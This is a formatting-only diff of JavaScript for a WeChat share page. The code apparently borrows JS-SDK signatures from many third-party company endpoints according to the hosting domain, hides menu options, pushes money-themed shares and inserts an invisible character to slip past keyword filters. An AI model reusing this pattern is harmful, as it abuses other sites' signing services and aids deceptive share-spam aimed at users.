-  function weinisongdu_config () {
+  function weinisongdu_config() {
     $.getJSON('http://qmks.weinisongdu.com/getSignPackage?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       var config = d;
       jssdk_config(config);
     });
   }
 
-  function shunfeng_config () {
+  function shunfeng_config() {
     $.getJSON('https://ylruiji.com/sign?site=shunfeng&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       var config = {
         appId: d.appId,
@@ -1086,76 +1074,73 @@ function showShareTips (obj) {
     });
   }
 
-  function amap_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://wb.amap.com/sign.php',
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d;
-          jssdk_config(config);
-        }
-      });
+  function amap_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://wb.amap.com/sign.php',
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d;
+        jssdk_config(config);
+      }
+    });
   }
 
-  function xinhuanet_config () {
+  function xinhuanet_config() {
     var currentUrl = location.href.split('#')[0];
-    $.ajax(
-      {
-        type: "GET",
-        url: '//api.home.news.cn/wx/jsapi.do?mpId=356&url=' + encodeURIComponent(currentUrl),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d.content;
-          if (d.content.url === currentUrl) {
-            jssdk_config(config);
-          } else {
-            xinhuanet_config();
-          }
+    $.ajax({
+      type: "GET",
+      url: '//api.home.news.cn/wx/jsapi.do?mpId=356&url=' + encodeURIComponent(currentUrl),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d.content;
+        if (d.content.url === currentUrl) {
+          jssdk_config(config);
+        } else {
+          xinhuanet_config();
         }
-      });
+      }
+    });
   }
 
-  function nos_config () {
+  function nos_config() {
     $.getScript('//wxsign.nie.netease.com/sharecom/wxjs.php?url=' + encodeURIComponent(location.href.split('#')[0]), function () {
       jssdk_config(wx_conf);
     });
   }
 
-  function cyzone_config () {
+  function cyzone_config() {
     $.getJSON('http://api1.cyzone.cn/v1/member/tools/jsSign?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       var config = d.data;
       jssdk_config(config);
     });
   }
 
-  function baidu_config () {
-    $.ajax(
-      {
-        type: "GET",
-        url: 'https://po.baidu.com/api/wechat/token.jsonp?app_id=wxadc1a0c6b9096e89&url=' + encodeURIComponent(location.href.split('#')[0]),
-        dataType: "jsonp",
-        jsonp: "callback",
-        callback: 'jsonp1',
-        data: {},
-        success: function (d) {
-          var config = d.data;
+  function baidu_config() {
+    $.ajax({
+      type: "GET",
+      url: 'https://po.baidu.com/api/wechat/token.jsonp?app_id=wxadc1a0c6b9096e89&url=' + encodeURIComponent(location.href.split('#')[0]),
+      dataType: "jsonp",
+      jsonp: "callback",
+      callback: 'jsonp1',
+      data: {},
+      success: function (d) {
+        var config = d.data;
+        jssdk_config(config);
+        setTimeout(function () {
           jssdk_config(config);
-          setTimeout(function () {
-            jssdk_config(config);
-          }, 500);
-        }
-      });
+        }, 500);
+      }
+    });
   }
 
-  function haozu_config () {
+  function haozu_config() {
     $.get('', function (html) {
       var reg = /wx\.config\(([^\)]*)\)/;
       reg.test(html);
@@ -1170,14 +1155,14 @@ function showShareTips (obj) {
     });
   }
 
-  function baihe_config () {
+  function baihe_config() {
     $.getJSON('http://m.hunli.baihe.com/wechat/getJsSign?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       var config = d.data.result;
       jssdk_config(config);
     });
   }
 
-  function wx189_config () {
+  function wx189_config() {
     $.getJSON('https://wechat.e.189.cn/api/wechat/jsapi/signature.do?cid=telecom_user_center&appid=21cn&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
       jssdk_config({
         appId: d.appId,
@@ -1188,7 +1173,7 @@ function showShareTips (obj) {
     });
   }
 
-  function suning_config () {
+  function suning_config() {
     var url = 'https://act.suning.com/act-wap-web/wap/public/getWechatToken.htm?url=' + encodeURIComponent(location.href.split('#')[0]) + '&isAuthorized=true';
     $.ajax({
       type: "GET",
@@ -1204,7 +1189,7 @@ function showShareTips (obj) {
     })
   }
 
-  function hnair_config () {
+  function hnair_config() {
     var url = 'https://wx.hnair.com/wxoauth/sns/getSignInfo?_=' + (+new Date()) + '&signurl=' + encodeURIComponent(location.href.split('#')[0]);
     $.ajax({
       type: "GET",
@@ -1219,7 +1204,7 @@ function showShareTips (obj) {
     })
   }
 
-  function jssdk_config (config) {
+  function jssdk_config(config) {
     config['jsApiList'] = ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems'];
     if (M.getParam('debug') === '1') {
       config['debug'] = true;
@@ -1232,8 +1217,7 @@ function showShareTips (obj) {
     wx.ready(function () {
       if (location_host.indexOf('dajie.com') > -1) {
         setTimeout(function () {
-          if (location_host.indexOf('dangdang.com') > -1) {
-          } else {
+          if (location_host.indexOf('dangdang.com') > -1) {} else {
             wx.hideOptionMenu();
           }
           if (M.getParam('debugx') === '1') {
@@ -1244,15 +1228,16 @@ function showShareTips (obj) {
               ]
             });
           } else {
-            wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+            wx.showMenuItems({
+              menuList: ['menuItem:share:appMessage']
+            });
           }
           shareFriend(window.data.to_group);
           shareTimeline(window.data.to_timeline);
         }, 200);
 
         setTimeout(function () {
-          if (location_host.indexOf('dangdang.com') > -1) {
-          } else {
+          if (location_host.indexOf('dangdang.com') > -1) {} else {
             wx.hideOptionMenu();
           }
           if (M.getParam('debugx') === '1') {
@@ -1263,15 +1248,16 @@ function showShareTips (obj) {
               ]
             });
           } else {
-            wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+            wx.showMenuItems({
+              menuList: ['menuItem:share:appMessage']
+            });
           }
           shareFriend(window.data.to_group);
           shareTimeline(window.data.to_timeline);
         }, 500);
 
       } else {
-        if (location_host.indexOf('dangdang.com') > -1) {
-        } else {
+        if (location_host.indexOf('dangdang.com') > -1) {} else {
           wx.hideOptionMenu();
         }
         if (M.getParam('debugx') === '1') {
@@ -1282,7 +1268,9 @@ function showShareTips (obj) {
             ]
           });
         } else {
-          wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+          wx.showMenuItems({
+            menuList: ['menuItem:share:appMessage']
+          });
         }
       }
 
@@ -1292,7 +1280,7 @@ function showShareTips (obj) {
     shareTimeline(window.data.to_timeline);
   }
 
-  function start_load () {
+  function start_load() {
     var data = window.data;
     if (data.attached['timeline_ad']) timeline_ad = true;
     if (data.attached['group_ad']) group_ad = true;
@@ -1383,9 +1371,11 @@ function showShareTips (obj) {
         wx189_config();
       } else if (location_host.indexOf('baihe.com') > -1) {
         baihe_config();
-      } /*else if (location_host.indexOf('rabbitpre.com') > -1) {
-        rabbitpre_config();
-      } */ else if (location_host.indexOf('suning.com') > -1) {
+      }
+      /*else if (location_host.indexOf('rabbitpre.com') > -1) {
+             rabbitpre_config();
+           } */
+      else if (location_host.indexOf('suning.com') > -1) {
         suning_config();
       } else if (location_host.indexOf('kujiale.com') > -1) {
         kujiale_config();
@@ -1407,7 +1397,7 @@ function showShareTips (obj) {
     shareTimeline();
   }
 
-  function init () {
+  function init() {
     if (typeof WeixinJSBridge === "undefined") {
       if (document.addEventListener) {
         document.addEventListener('WeixinJSBridgeReady', start_load, false);
@@ -1427,7 +1417,8 @@ function showShareTips (obj) {
 }())
 
 
-;(function () {
+;
+(function () {
 
   var config = {
     tpl: {
@@ -1451,7 +1442,7 @@ function showShareTips (obj) {
     }
   };
 
-  function initPage (money) {
+  function initPage(money) {
     M.resetFont();
     $(document.body).append(config.tpl.body.jstpl_format({
       money: money
@@ -1462,10 +1453,9 @@ function showShareTips (obj) {
     });
   }
 
-  function bindEvent () {
+  function bindEvent() {
 
-    document.body.onclick = function () {
-    }
+    document.body.onclick = function () {}
     $(document.body).on('click', '.js_global_dialog_cancel_btn', function (event) {
       event.preventDefault();
       g_js_cancel_dialog(0);
@@ -1480,8 +1470,7 @@ function showShareTips (obj) {
       return false;
     });
 
-    document.body.onclick = function () {
-    }
+    document.body.onclick = function () {}
 
     $('.share-container').on('click', function () {
       if (!window['g_tips_message_obj']) {
@@ -1508,7 +1497,7 @@ function showShareTips (obj) {
 
   }
 
-  function replaceMoney (obj, money) {
+  function replaceMoney(obj, money) {
     obj = obj || {}
     if (obj.title) {
       obj.title = obj.title.replace('{moneyStr}', money).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq);
@@ -1524,7 +1513,7 @@ function showShareTips (obj) {
     }
   }
 
-  function init () {
+  function init() {
 
     record('tosharer', site);
     evkey && record('tosharer', evkey);
@@ -1601,5 +1590,3 @@ function showShareTips (obj) {
     M.loadJS('https://hm.baidu.com/hm.js?eb6e5fa34f260ead64122dfad061a9f6', 'async');
   }
 }());
-
-
